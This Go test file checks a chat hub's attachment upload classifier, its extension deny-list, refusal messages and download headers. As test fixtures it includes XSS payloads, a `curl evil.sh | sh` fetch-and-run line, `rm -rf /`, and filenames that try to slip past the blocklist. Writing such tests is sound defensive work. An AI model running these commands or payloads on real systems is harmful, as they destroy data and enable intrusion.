// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//go:build !no_sqlite

package hub

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io/fs"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
)

// Classification decides what an upload is stored as, from its bytes and its
// name. The tests below hold three lines at once: the developer formats #1045
// is about are accepted, the blocked extensions stay blocked however the
// content is dressed up, and a claimed Content-Type buys nothing.

func TestClassifyAttachment_TextLikeExtensions(t *testing.T) {
	// Every extension the brief lists as accept-as-text (D4). Each is stored
	// as text, so the composer's preview and the download path treat them all
	// the same way.
	extensions := []string{
		".json", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".env", ".log",
		".csv", ".xml", ".diff", ".patch", ".txt", ".md", ".rst", ".adoc",
		".sql", ".graphql", ".proto", ".ts", ".tsx", ".jsx", ".py", ".go",
		".rs", ".rb", ".java", ".kt", ".swift", ".c", ".cpp", ".h", ".hpp",
		".cs",
	}
	for _, ext := range extensions {
		t.Run(ext, func(t *testing.T) {
			got, err := ClassifyAttachment("notes"+ext, []byte("some plain content\n"))
			if err != nil {
				t.Fatalf("ClassifyAttachment(%q) error: %v", ext, err)
			}
			want := "text/plain"
			if ext == ".md" {
				want = "text/markdown"
			}
			if got != want {
				t.Errorf("ClassifyAttachment(%q) = %q, want %q", ext, got, want)
			}
			if IsDangerousMimeType(got) {
				t.Errorf("%q classified as %q, which the deny-list rejects", ext, got)
			}
		})
	}
}

// A dotfile is all extension. .env is the one people actually attach.
func TestClassifyAttachment_BareDotfile(t *testing.T) {
	got, err := ClassifyAttachment(".env", []byte("API_KEY=redacted\n"))
	if err != nil {
		t.Fatalf("ClassifyAttachment(.env) error: %v", err)
	}
	if got != "text/plain" {
		t.Errorf("ClassifyAttachment(.env) = %q, want text/plain", got)
	}
}

func TestClassifyAttachment_RejectsDangerousExtensions(t *testing.T) {
	// Every blocked extension, offered with innocent text content — the shape
	// of an attempt to sneak one through. None may be accepted (D2).
	for ext := range DangerousExtensions {
		t.Run(ext, func(t *testing.T) {
			if _, err := ClassifyAttachment("payload"+ext, []byte("echo hello\n")); err == nil {
				t.Errorf("ClassifyAttachment(%q) was accepted; blocked extensions must stay blocked", ext)
			}
		})
	}
}

// .js is blocked and .jsx is not: the blocklist is about what a browser will
// run, and the pair is the easiest place for that distinction to be lost.
func TestClassifyAttachment_JSBlockedJSXAccepted(t *testing.T) {
	if _, err := ClassifyAttachment("app.js", []byte("export const x = 1;\n")); err == nil {
		t.Error("app.js was accepted; .js must stay blocked")
	}
	got, err := ClassifyAttachment("app.jsx", []byte("export const x = <div />;\n"))
	if err != nil {
		t.Fatalf("app.jsx rejected: %v", err)
	}
	if got != "text/plain" {
		t.Errorf("app.jsx = %q, want text/plain", got)
	}
}

func TestClassifyAttachment_RejectsHTMLAndScriptContent(t *testing.T) {
	// Sniffed HTML has no accepted extension to hide behind, and the allowlist
	// keeps text/html and application/javascript out (D3).
	tests := []struct {
		name    string
		content string
	}{
		{"page.html", "<!DOCTYPE html><html><body>hi</body></html>"},
		{"page.htm", "<html><head></head><body>hi</body></html>"},
		{"widget.svg", `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"></svg>`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ClassifyAttachment(tt.name, []byte(tt.content))
			if err == nil {
				t.Errorf("%s accepted as %q; markup must not be stored under an executable-in-a-browser type", tt.name, got)
			}
		})
	}
}

// The sniff-based refusal above only fires on content that trips one of Go's
// seventeen HTML tag signatures. These payloads trip none of them, so before
// the extension check each was classified text/plain and stored.
func TestClassifyAttachment_RefusesMarkupExtensions(t *testing.T) {
	payloads := []string{
		`<img src=x onerror=alert(document.domain)>`,
		`<svg onload=alert(1)>`,
		`<video><source onerror=alert(1)></video>`,
		"just some words\n", // the extension decides, not the content
	}
	// The trailing-space and trailing-dot spellings are here because the same
	// normalisation has to serve this list and the executable blocklist.
	names := []string{
		"a.html", "a.htm", "a.xhtml", "a.shtml", "a.mhtml", "a.mht", "a.svg",
		"a.HTML", "a.html ", "a.html.",
		"a.hta", // refused as an executable rather than as markup
	}
	for _, name := range names {
		for _, payload := range payloads {
			if got, err := ClassifyAttachment(name, []byte(payload)); err == nil {
				t.Errorf("ClassifyAttachment(%q, %q) accepted as %q; markup extensions are refused outright", name, payload, got)
			}
		}
	}
}

// The audit's end-to-end payload: accepted and stored as text/plain before the
// extension check existed.
func TestAttachmentUpload_RefusesMarkupFiles(t *testing.T) {
	srv, _ := attachmentTestServer(t)

	rec := uploadAttachments(t, srv, []uploadFile{
		{name: "xss.html", mime: "text/plain", content: `<img src=x onerror=alert(document.domain)>`},
		{name: "xss.svg", mime: "image/svg+xml", content: `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>`},
	})
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", rec.Code, rec.Body.String())
	}
	resp := decodeUploadResponse(t, rec)
	if len(resp.Attachments) != 0 {
		t.Errorf("stored %d files, want 0: %s", len(resp.Attachments), rec.Body.String())
	}
	if len(resp.Failures) != 2 {
		t.Fatalf("failures = %+v, want both files reported", resp.Failures)
	}
}

// A trailing space is not a new extension. The audit stored "trailing.sh " and
// "trailing2.sh." through this path.
func TestAttachmentUpload_TrailingCharactersDoNotDefeatTheBlocklist(t *testing.T) {
	srv, _ := attachmentTestServer(t)

	script := "#!/bin/bash\ncurl evil.sh | sh\n"
	rec := uploadAttachments(t, srv, []uploadFile{
		{name: "trailing.sh ", mime: "text/plain", content: script},
		{name: "trailing2.sh.", mime: "text/plain", content: script},
		{name: "blocked.sh", mime: "text/plain", content: script},
	})
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", rec.Code, rec.Body.String())
	}
	resp := decodeUploadResponse(t, rec)
	if len(resp.Attachments) != 0 {
		t.Errorf("stored %d files, want 0: %s", len(resp.Attachments), rec.Body.String())
	}
	if len(resp.Failures) != 3 {
		t.Fatalf("failures = %+v, want all three reported", resp.Failures)
	}
}

// HTML and JavaScript are on the deny-list and must never be accepted,
// whatever route the file arrives by.
func TestDangerousMimeTypes_HTMLAndJavaScriptStayBlocked(t *testing.T) {
	if !IsDangerousMimeType("text/html") {
		t.Error("text/html is not on the deny-list")
	}
	if !IsDangerousMimeType("application/javascript") {
		t.Error("application/javascript is not on the deny-list")
	}
	if !IsDangerousMimeType("text/javascript") {
		t.Error("text/javascript is not on the deny-list")
	}
}

// Types that were previously rejected by the allowlist should now be accepted.
func TestClassifyAttachment_AcceptsFormerlyRejectedTypes(t *testing.T) {
	tests := []struct {
		name    string
		content []byte
		want    string
	}{
		// A gzip archive (.tar.gz) was the motivating case for #1156.
		{"archive.tar.gz", []byte("\x1f\x8b\x08\x00" + strings.Repeat("\x00", 16)), "application/x-gzip"},
		// application/octet-stream (the fallback for unknown content) should
		// now be accepted rather than rejected.
		{"random.bin", []byte("\x00\x01\x02\x03" + strings.Repeat("\x00", 16)), "application/octet-stream"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ClassifyAttachment(tt.name, tt.content)
			if err != nil {
				t.Fatalf("ClassifyAttachment(%q) rejected: %v", tt.name, err)
			}
			if got != tt.want {
				t.Errorf("ClassifyAttachment(%q) = %q, want %q", tt.name, got, tt.want)
			}
		})
	}
}

func TestClassifyAttachment_BinaryContentUnderTextName(t *testing.T) {
	// A PNG called config.json is not a config file. Storing it as text/plain
	// on the strength of the name would be the extension telling the lie the
	// content check exists to catch.
	png := []byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0}
	if got, err := ClassifyAttachment("config.json", png); err == nil {
		t.Errorf("binary content under a .json name accepted as %q", got)
	}
}

func TestClassifyAttachment_DetectsRealTypes(t *testing.T) {
	tests := []struct {
		name    string
		content []byte
		want    string
	}{
		{"photo.png", []byte("\x89PNG\r\n\x1a\n" + strings.Repeat("\x00", 16)), "image/png"},
		{"photo.jpg", []byte("\xff\xd8\xff\xe0" + strings.Repeat("\x00", 16)), "image/jpeg"},
		{"paper.pdf", []byte("%PDF-1.7\n" + strings.Repeat("x", 16)), "application/pdf"},
		{"bundle.zip", append([]byte("PK\x03\x04"), bytes.Repeat([]byte{0}, 16)...), "application/zip"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ClassifyAttachment(tt.name, tt.content)
			if err != nil {
				t.Fatalf("ClassifyAttachment(%q) error: %v", tt.name, err)
			}
			if got != tt.want {
				t.Errorf("ClassifyAttachment(%q) = %q, want %q", tt.name, got, tt.want)
			}
		})
	}
}

func TestClassifyAttachment_EmptyFileIsText(t *testing.T) {
	got, err := ClassifyAttachment("empty.log", nil)
	if err != nil {
		t.Fatalf("empty file rejected: %v", err)
	}
	if got != "text/plain" {
		t.Errorf("empty.log = %q, want text/plain", got)
	}
}

// Text files with unusual control characters (e.g. vertical tab 0x0B) cause
// Go's http.DetectContentType to return application/octet-stream, which used
// to be rejected. Since the extension is a known text-like extension, the
// content sniffer's "I don't know" should be treated as text.
func TestClassifyAttachment_TextWithUnusualControlChars(t *testing.T) {
	tests := []struct {
		name     string
		filename string
		head     []byte
		wantMIME string
	}{
		{
			name:     "markdown with vertical tab",
			filename: "doc.md",
			head:     []byte("# Title\n\nSome text\x0bMore text\n"),
			wantMIME: "text/markdown",
		},
		{
			name:     "json with vertical tab",
			filename: "config.json",
			head:     []byte("{\"key\": \"value\x0b\"}\n"),
			wantMIME: "text/plain",
		},
		{
			name:     "yaml with vertical tab",
			filename: "deploy.yaml",
			head:     []byte("services:\n  hub:\x0b {}\n"),
			wantMIME: "text/plain",
		},
		{
			name:     "go source with vertical tab",
			filename: "main.go",
			head:     []byte("package main\n\nfunc main() {\x0b}\n"),
			wantMIME: "text/plain",
		},
		{
			name:     "log with vertical tab",
			filename: "app.log",
			head:     []byte("2026-01-01 INFO started\x0bmore output\n"),
			wantMIME: "text/plain",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ClassifyAttachment(tt.filename, tt.head)
			if err != nil {
				t.Fatalf("ClassifyAttachment(%q) error: %v", tt.filename, err)
			}
			if got != tt.wantMIME {
				t.Errorf("ClassifyAttachment(%q) = %q, want %q", tt.filename, got, tt.wantMIME)
			}
		})
	}

	// Null bytes in content with a text-like extension should be rejected —
	// they indicate genuinely binary data wearing a text-like name.
	nullTests := []struct {
		name     string
		filename string
		head     []byte
	}{
		{
			name:     "text with null byte",
			filename: "doc.md",
			head:     []byte("# Title\x00binary"),
		},
	}
	for _, tt := range nullTests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ClassifyAttachment(tt.filename, tt.head)
			if err == nil {
				t.Errorf("ClassifyAttachment(%q) accepted content with null bytes; want rejection", tt.filename)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Upload handler: classification and per-file results
// ---------------------------------------------------------------------------

type uploadFile struct {
	name    string
	mime    string // the Content-Type the client claims
	content string
}

// uploadAttachments posts a batch of files to the upload endpoint.
func uploadAttachments(t *testing.T, srv *Server, files []uploadFile) *httptest.ResponseRecorder {
	t.Helper()

	var body bytes.Buffer
	mw := multipart.NewWriter(&body)
	for _, f := range files {
		h := make(map[string][]string)
		h["Content-Disposition"] = []string{
			fmt.Sprintf(`form-data; name="files"; filename=%q`, f.name),
		}
		h["Content-Type"] = []string{f.mime}
		part, err := mw.CreatePart(h)
		if err != nil {
			t.Fatalf("CreatePart: %v", err)
		}
		if _, err := part.Write([]byte(f.content)); err != nil {
			t.Fatalf("write part: %v", err)
		}
	}
	if err := mw.Close(); err != nil {
		t.Fatalf("close writer: %v", err)
	}

	req := httptest.NewRequest(http.MethodPost, "/api/v1/chat/attachments", &body)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("Authorization", "Bearer "+testDevToken)

	rec := httptest.NewRecorder()
	srv.Handler().ServeHTTP(rec, req)
	return rec
}

type uploadResponse struct {
	Attachments []attachmentUploadResult  `json:"attachments"`
	Failures    []attachmentUploadFailure `json:"failures"`
}

func decodeUploadResponse(t *testing.T, rec *httptest.ResponseRecorder) uploadResponse {
	t.Helper()
	var resp uploadResponse
	if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	return resp
}

func TestAttachmentUpload_StoresDeveloperFilesAsText(t *testing.T) {
	srv, _ := attachmentTestServer(t)

	// The browser sends application/octet-stream for formats it does not
	// recognise. Before #1045 that alone rejected the file.
	rec := uploadAttachments(t, srv, []uploadFile{
		{name: "compose.yaml", mime: "application/octet-stream", content: "services:\n  hub: {}\n"},
		{name: "main.go", mime: "", content: "package main\n"},
		{name: "notes.md", mime: "application/octet-stream", content: "# Notes\n"},
	})
	if rec.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", rec.Code, rec.Body.String())
	}

	resp := decodeUploadResponse(t, rec)
	if len(resp.Attachments) != 3 || len(resp.Failures) != 0 {
		t.Fatalf("got %d stored / %d failed, want 3 / 0: %s", len(resp.Attachments), len(resp.Failures), rec.Body.String())
	}
	want := map[string]string{
		"compose.yaml": "text/plain",
		"main.go":      "text/plain",
		"notes.md":     "text/markdown",
	}
	for _, att := range resp.Attachments {
		if want[att.Name] != att.MimeType {
			t.Errorf("%s stored as %q, want %q", att.Name, att.MimeType, want[att.Name])
		}
	}
}

func TestAttachmentUpload_IgnoresClaimedContentType(t *testing.T) {
	srv, _ := attachmentTestServer(t)

	// A shell script announcing itself as text/plain. The extension is
	// blocked, and the claim does not change that.
	rec := uploadAttachments(t, srv, []uploadFile{
		{name: "install.sh", mime: "text/plain", content: "#!/bin/sh\nrm -rf /\n"},
	})
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", rec.Code, rec.Body.String())
	}
	resp := decodeUploadResponse(t, rec)
	if len(resp.Attachments) != 0 {
		t.Errorf("stored %d files, want 0", len(resp.Attachments))
	}
	if len(resp.Failures) != 1 || resp.Failures[0].Name != "install.sh" {
		t.Fatalf("failures = %+v, want one entry for install.sh", resp.Failures)
	}

	// And the reverse: a PNG announcing itself as an executable type is stored
	// for what it is.
	rec = uploadAttachments(t, srv, []uploadFile{
		{name: "photo.png", mime: "application/x-msdownload", content: "\x89PNG\r\n\x1a\n" + strings.Repeat("\x00", 16)},
	})
	if rec.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", rec.Code, rec.Body.String())
	}
	resp = decodeUploadResponse(t, rec)
	if len(resp.Attachments) != 1 || resp.Attachments[0].MimeType != "image/png" {
		t.Fatalf("attachments = %+v, want one image/png", resp.Attachments)
	}
}

func TestAttachmentUpload_PartialSuccess(t *testing.T) {
	srv, _ := attachmentTestServer(t)

	rec := uploadAttachments(t, srv, []uploadFile{
		{name: "good.json", mime: "application/octet-stream", content: `{"ok":true}`},
		{name: "bad.exe", mime: "application/octet-stream", content: "MZ binary"},
		{name: "also-good.log", mime: "application/octet-stream", content: "started\n"},
	})

	// Something was created, so the request created something: 201, with the
	// per-file outcome in the body.
	if rec.Code != http.StatusCreated {
		t.Fatalf("expected 201 for a partial success, got %d: %s", rec.Code, rec.Body.String())
	}
	resp := decodeUploadResponse(t, rec)
	if len(resp.Attachments) != 2 {
		t.Errorf("stored %d files, want 2 (the bad one must not take the good ones down): %s",
			len(resp.Attachments), rec.Body.String())
	}
	if len(resp.Failures) != 1 || resp.Failures[0].Name != "bad.exe" {
		t.Fatalf("failures = %+v, want one entry for bad.exe", resp.Failures)
	}
	if resp.Failures[0].Error == "" {
		t.Error("failure carries no reason; the composer has nothing to show the user")
	}
}

func TestAttachmentUpload_AllFilesRejected(t *testing.T) {
	srv, _ := attachmentTestServer(t)

	rec := uploadAttachments(t, srv, []uploadFile{
		{name: "a.exe", mime: "application/octet-stream", content: "MZ"},
		{name: "b.bat", mime: "text/plain", content: "@echo off"},
	})
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 when nothing was created, got %d: %s", rec.Code, rec.Body.String())
	}
	resp := decodeUploadResponse(t, rec)
	if len(resp.Failures) != 2 {
		t.Errorf("failures = %+v, want both files reported", resp.Failures)
	}
}

// The composer prints the filename and this string side by side, so the string
// has to be one reason and not a stack of subjects. Moving the extension
// refusal into SanitizeFilename put it behind the upload path's wrapper, which
// produced "invalid filename: files with a .html extension are not accepted"
// and, for a dot-only name, "invalid filename: invalid filename" (#1045).
//
// Exact strings, not substrings: this is the whole of what the user is told.
func TestAttachmentUpload_FailureMessageIsASingleReason(t *testing.T) {
	srv, _ := attachmentTestServer(t)

	cases := []struct {
		file uploadFile
		want string
	}{
		{uploadFile{name: "evil.html", mime: "text/plain", content: "<img src=x onerror=alert(1)>"},
			"files with a .html extension are not accepted"},
		{uploadFile{name: "diagram.svg", mime: "image/svg+xml", content: "<svg/>"},
			"files with a .svg extension are not accepted"},
		{uploadFile{name: "bad.exe", mime: "application/octet-stream", content: "MZ binary"},
			"dangerous file extension: .exe"},
		{uploadFile{name: "..", mime: "text/plain", content: "hi"},
			"invalid filename"},
	}
	for _, tc := range cases {
		rec := uploadAttachments(t, srv, []uploadFile{tc.file})
		resp := decodeUploadResponse(t, rec)
		if len(resp.Failures) != 1 {
			t.Fatalf("%q: failures = %+v, want exactly one", tc.file.name, resp.Failures)
		}
		if resp.Failures[0].Error != tc.want {
			t.Errorf("%q: failure text = %q, want %q", tc.file.name, resp.Failures[0].Error, tc.want)
		}
	}
}

func TestAttachmentUpload_OversizedFileIsAPerFileFailure(t *testing.T) {
	srv, _ := attachmentTestServer(t)

	rec := uploadAttachments(t, srv, []uploadFile{
		{name: "small.txt", mime: "text/plain", content: "hi"},
		{name: "huge.log", mime: "text/plain", content: strings.Repeat("x", MaxAttachmentSize+1)},
	})
	if rec.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", rec.Code, rec.Body.String())
	}
	resp := decodeUploadResponse(t, rec)
	if len(resp.Attachments) != 1 || resp.Attachments[0].Name != "small.txt" {
		t.Fatalf("attachments = %+v, want just small.txt", resp.Attachments)
	}
	if len(resp.Failures) != 1 || resp.Failures[0].Name != "huge.log" {
		t.Fatalf("failures = %+v, want one entry for huge.log", resp.Failures)
	}
	if !strings.Contains(resp.Failures[0].Error, "maximum size") {
		t.Errorf("failure reason = %q, want it to mention the size limit", resp.Failures[0].Error)
	}
}

// ---------------------------------------------------------------------------
// Download headers
// ---------------------------------------------------------------------------

// Storing developer files as text is now the ordinary path, and what keeps a
// stored text file from being interpreted is two response headers: nosniff, so
// a browser does not go looking for markup in a text/plain body, and an
// attachment disposition, so it is never rendered as a top-level document.
// Nothing asserted either of them before, which made the whole "stored as text
// is harmless" argument rest on code no test defended.
func TestAttachmentDownload_SetsNosniffAndDisposition(t *testing.T) {
	srv, _ := attachmentTestServer(t)

	rec := uploadAttachments(t, srv, []uploadFile{
		{name: "notes.log", mime: "application/octet-stream", content: "started\n"},
		{name: "readme.md", mime: "application/octet-stream", content: "# Readme\n"},
		{name: "bundle.zip", mime: "application/octet-stream", content: "PK\x03\x04" + strings.Repeat("\x00", 16)},
		{name: "photo.png", mime: "application/octet-stream", content: "\x89PNG\r\n\x1a\n" + strings.Repeat("\x00", 16)},
	})
	if rec.Code != http.StatusCreated {
		t.Fatalf("upload: expected 201, got %d: %s", rec.Code, rec.Body.String())
	}
	resp := decodeUploadResponse(t, rec)
	if len(resp.Attachments) != 4 {
		t.Fatalf("stored %d files, want 4: %s", len(resp.Attachments), rec.Body.String())
	}

	want := map[string]struct{ mime, disposition string }{
		"notes.log":  {"text/plain", "attachment"},
		"readme.md":  {"text/markdown", "attachment"},
		"bundle.zip": {"application/zip", "attachment"},
		// The one type that is served for the browser to render, and the only
		// one that may be.
		"photo.png": {"image/png", "inline"},
	}
	for _, att := range resp.Attachments {
		expected, ok := want[att.Name]
		if !ok {
			t.Fatalf("unexpected attachment %q", att.Name)
		}
		got := doRequest(t, srv, http.MethodGet, att.URL, nil)
		if got.Code != http.StatusOK {
			t.Fatalf("GET %s: expected 200, got %d: %s", att.URL, got.Code, got.Body.String())
		}
		if h := got.Header().Get("X-Content-Type-Options"); h != "nosniff" {
			t.Errorf("%s: X-Content-Type-Options = %q, want nosniff", att.Name, h)
		}
		if h := got.Header().Get("Content-Type"); h != expected.mime {
			t.Errorf("%s: Content-Type = %q, want %q", att.Name, h, expected.mime)
		}
		wantCD := expected.disposition + `; filename="` + att.Name + `"`
		if h := got.Header().Get("Content-Disposition"); h != wantCD {
			t.Errorf("%s: Content-Disposition = %q, want %q", att.Name, h, wantCD)
		}
	}
}

// ---------------------------------------------------------------------------
// Orphan blobs (#1089)
// ---------------------------------------------------------------------------

// createAttachmentFailingStore fails the metadata write for named files and
// passes everything else through, which is the shape of the real failure: the
// blob is already saved when the DB call comes back with an error.
type createAttachmentFailingStore struct {
	WebChatStore
	failNames map[string]bool
}

func (s createAttachmentFailingStore) CreateAttachment(ctx context.Context, meta AttachmentMeta) error {
	if s.failNames[meta.Filename] {
		return fmt.Errorf("injected metadata failure")
	}
	return s.WebChatStore.CreateAttachment(ctx, meta)
}

func countStoredBlobs(t *testing.T, dir string) []string {
	t.Helper()
	var names []string
	err := filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if !d.IsDir() {
			names = append(names, d.Name())
		}
		return nil
	})
	if err != nil {
		t.Fatalf("walk %s: %v", dir, err)
	}
	return names
}

// A blob whose metadata write failed is unreachable: the download path finds
// attachments through the row that was never written. It used to stay on disk
// for good, one per request; the per-file loop would have made it ten.
func TestAttachmentUpload_MetadataFailureLeavesNoOrphanBlob(t *testing.T) {
	srv, _ := attachmentTestServer(t)

	dir := t.TempDir()
	as, err := NewLocalDiskAttachmentStore(dir)
	if err != nil {
		t.Fatalf("NewLocalDiskAttachmentStore: %v", err)
	}
	srv.SetAttachmentStore(as)
	srv.SetWebChatStore(createAttachmentFailingStore{
		WebChatStore: srv.webChatStore,
		failNames:    map[string]bool{"boom.log": true},
	})

	rec := uploadAttachments(t, srv, []uploadFile{
		{name: "first.log", mime: "application/octet-stream", content: "one\n"},
		{name: "boom.log", mime: "application/octet-stream", content: "two\n"},
		{name: "third.log", mime: "application/octet-stream", content: "three\n"},
	})
	if rec.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", rec.Code, rec.Body.String())
	}
	resp := decodeUploadResponse(t, rec)
	if len(resp.Attachments) != 2 {
		t.Fatalf("stored %d files, want 2 (the rest of the batch survives): %s", len(resp.Attachments), rec.Body.String())
	}
	if len(resp.Failures) != 1 || resp.Failures[0].Name != "boom.log" {
		t.Fatalf("failures = %+v, want one entry for boom.log", resp.Failures)
	}

	blobs := countStoredBlobs(t, dir)
	if len(blobs) != 2 {
		t.Fatalf("on disk: %v, want exactly the two files that got a row", blobs)
	}
	for _, name := range blobs {
		if name == "boom.log" {
			t.Errorf("boom.log is still on disk with no row to reach it")
		}
	}
}
